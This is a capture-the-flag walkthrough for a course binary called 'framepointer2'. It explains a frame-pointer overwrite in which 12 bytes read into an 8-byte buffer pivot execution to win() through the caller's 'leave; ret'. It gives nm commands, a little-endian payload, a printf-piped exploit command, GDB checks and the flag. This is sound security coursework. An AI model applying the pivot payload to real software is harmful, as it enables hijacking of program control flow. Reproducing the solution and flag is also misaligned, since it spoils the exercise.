
# Frame Pointer 2 Walkthrough (Exam-Ready)

This challenge is the same vulnerability class as framepointer1.

## Fast Exam Read

If you see this pattern:

- local `buf[8]`
- `read(0, buf, 12)`
- stack leak for `buf`
- no direct `win()` leak

then solve it with the same 12-byte frame-pointer pivot payload:

`[fake_EBP][target_addr][buffer_addr]`

Only one step changes from fp1: you must discover `target_addr` (`win`) from the binary.

## Core Idea

- 12 bytes into `buf[8]` reaches saved EBP of `vuln`, not `vuln`'s saved return address.
- You overwrite saved EBP with `buf`.
- `caller` later executes `leave; ret` and pivots into your fake frame at `buf`.
- Inside that fake frame, the return target is `win`.

Payload layout (12 bytes):

- bytes `0..3`: fake EBP (usually `0x41414141`)
- bytes `4..7`: `win` address
- bytes `8..11`: leaked `buf` address

## Manual Method

### Step 1: Find `win()`

```bash
cd /home/jbenjam7/cs466/ctf/framepointer2
nm challenge | grep " T win"
```

Example:

```text
0804919d T win
```

So `win = 0x0804919d` and little-endian bytes are `\x9d\x91\x04\x08`.

### Step 2: Leak `buf`

```bash
./challenge
```

Example:

```text
buf @ 0xffc503b8
```

Little-endian for `0xffc503b8` is `\xb8\x03\xc5\xff`.

### Step 3: Build Payload

```text
[fake_EBP][win][buf]
```

Using the examples above:

```text
\x41\x41\x41\x41\x9d\x91\x04\x08\xb8\x03\xc5\xff
```

### Step 4: Send Exploit

```bash
printf '\x41\x41\x41\x41\x9d\x91\x04\x08\xb8\x03\xc5\xff' | ./challenge
```

Expected success output includes:

```text
cosc466-flag-{fp_h4rd3r}
```

## GDB Sanity Check (Optional)

```bash
gdb -q ./challenge
```

```gdb
b *vuln+20
run < /dev/null
info frame
x/12wx $esp
```

What to verify:

- `buf` is 8 bytes below saved EBP
- bytes `8..11` of your input land on saved EBP
- pivot happens through `caller` epilogue

## Differences vs framepointer1

- Same overflow mechanics
- Same payload shape
- Same pivot strategy
- Only difference: fp1 leaks target function, fp2 requires `nm`/`objdump`

## Exam Workflow

1. Get target function address (`nm`/`objdump`).
2. Run binary once, copy leaked `buf` address.
3. Convert both to little-endian.
4. Send `[fake_EBP][target][buf]`.
5. If crash, re-check byte order and offsets before changing strategy.
